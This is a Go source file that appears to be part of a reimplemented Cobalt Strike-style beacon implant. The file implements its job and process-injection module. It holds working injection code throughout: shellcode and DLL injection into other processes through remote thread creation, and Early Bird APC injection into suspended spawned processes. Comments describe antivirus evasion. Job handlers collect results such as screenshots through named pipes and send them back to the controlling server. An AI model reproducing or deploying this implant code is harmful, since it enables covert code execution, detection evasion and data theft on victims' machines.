package command

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Microsoft/go-winio"
	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
	"io"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"strings"
	"time"
	"unsafe"
)

// use windows packet as much as possible
var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	advapi32                = windows.NewLazyDLL("Advapi32.dll")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
	createRemoteThreadEx    = kernel32.NewProc("CreateRemoteThreadEx")
	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
	createThread            = kernel32.NewProc("CreateThread")
	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	adjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	logonUserA              = advapi32.NewProc("LogonUserA")
)

type job struct {
	jid         int
	pid         uint32
	description string
	pipeName    string
	stopCh      chan bool
}

var jobs []job

// there is no static var in golang
var jobCnt = 0

// init length to 1, or it will block until receiver receive message
var pidChan = make(chan uint32, 1)

func removeJob(jid int) {
	for i, job := range jobs {
		if job.jid == jid {
			jobs = append(jobs[:i], jobs[i+1:]...)
		}
	}
}

// implement of beacon.Job

// inject command specify a pid to inject, so it seems no need to adjust whether it is x86 or x64
// TODO still didn't work
func InjectDll(b []byte) error {
	pid, dll, err := parseInject(b)
	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// if you don't put a value into channel will cause blocking in handle job
		pidChan <- 0
		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
	}
	pidChan <- pid
	// record job here
	return createRemoteThread(processHandle, dll)
}

// you should ensure x86 shellcode inject to x86 process
func getSpawnProcessX86() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := config.SpawnToX86
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := strings.Replace(config.SpawnToX86, "syswow64", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func getSpawnProcessX64() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := config.SpawnToX64
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func SpawnAndInjectDllX64(dll []byte) error {
	program, args := getSpawnProcessX64()
	err := spawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDllX86(dll []byte) error {
	program, args := getSpawnProcessX86()
	err := spawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func spawnAndInjectDll(dll []byte, program string, args string) error {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
		pidChan <- 0
		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	pidChan <- procInfo.ProcessId
	return callUserAPC(procInfo, dll)

	// createRemoteThread can be easily caught, you should never use it
	//return createRemoteThread(procInfo, dll)
}

// copy from GolangBypassAV EarlyBird
func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(procInfo.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
	}
	var length uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(procInfo.Process, addr, &shellcode[0], uintptr(len(shellcode)), &length)
	if errWriteProcessMemory != nil {
		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(procInfo.Process), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
	}
	_, _, err := queueUserAPC.Call(addr, uintptr(procInfo.Thread), 0)
	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
	}
	_, errResumeThread := windows.ResumeThread(procInfo.Thread)
	if errResumeThread != nil {
		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
	}
	errCloseThreadHandle := windows.CloseHandle(procInfo.Thread)
	if errCloseThreadHandle != nil {
		return errors.New(fmt.Sprintf("CloseHandle error: %s", errCloseThreadHandle.Error()))
	}
	return nil
}

func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAllocEx failed and returned 0")
	}
	var writtenBytes uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &writtenBytes)

	if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
	}

	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, 0)
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
	}

	errCloseHandle := windows.CloseHandle(processHandle)
	if errCloseHandle != nil {
		return errors.New(fmt.Sprintf("[!]Error calling CloseHandle: %s", errCloseHandle))
	}
	return nil
}

func HandlerJobAsync(b []byte) error {
	buf := bytes.NewBuffer(b)
	// inject it gives pid, spawn it gives zero
	pidByte := make([]byte, 4)
	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	_, _ = buf.Read(pidByte)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	callbackType := packet.ReadShort(callbackTypeByte)
	sleepTime := packet.ReadShort(sleepTimeByte)
	pipeName, _ := parseAnArg(buf)
	commandType, _ := parseAnArg(buf)
	// I guess this is kind of sync
	pid := <-pidChan
	if pid == 0 {
		return nil
	}
	currentJid := jobCnt
	stopCh := make(chan bool, 1)
	j := job{
		jid:         jobCnt,
		pid:         pid,
		description: string(commandType),
		pipeName:    string(pipeName),
		stopCh:      stopCh,
	}
	jobCnt++
	jobs = append(jobs, j)

	// change it async
	go func() {
		// sleep time some time is small, some time is huge, so set it to Microsecond
		//fmt.Printf("Sleep time: %d\n", sleepTime)
		time.Sleep(time.Microsecond * time.Duration(sleepTime))
		result, err := readNamedPipe(j)
		if err != nil {
			ErrorMessage(err.Error())
			removeJob(currentJid)
			return
		}

		switch string(commandType) {
		case "take screenshot":
			// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
			result = result[4:]
		default:
		}
		finalPacket := packet.MakePacket(int(callbackType), []byte(result))
		packet.PushResult(finalPacket)
		removeJob(currentJid)
	}()
	return nil
}

func ListJobs() error {
	result := ""
	for _, job := range jobs {
		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
	}
	finalPacket := packet.MakePacket(CALLBACK_LIST_JOBS, []byte(result))
	packet.PushResult(finalPacket)
	return nil
}

func KillJob(b []byte) error {
	jid := packet.ReadShort(b)
	for _, j := range jobs {
		if j.jid == int(jid) {
			j.stopCh <- true
			processes, err := process.Processes()
			if err != nil {
				return err
			}
			for _, p := range processes {
				if p.Pid == int32(j.pid) {
					// TODO in case of inject, this would kill a normal process
					removeJob(j.jid)
					err = p.Kill()
					if err != nil {
						return err
					}
				}
			}
		}
	}
	return nil
}

func readNamedPipe(j job) (string, error) {
	pipe, err := winio.DialPipe(j.pipeName, nil)
	if err != nil {
		// try it twice in case of sleep time is too short
		pipe, err = winio.DialPipe(j.pipeName, nil)
		if err != nil {
			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
		}
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512)
	for {
		select {
		case <-j.stopCh:
			return "", errors.New("job canceled")
		default:
			n, err := pipe.Read(buf)
			if err != nil {
				if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
					return "", err
				}
				return result, nil
			}
			result += string(buf[:n])
		}
	}
}
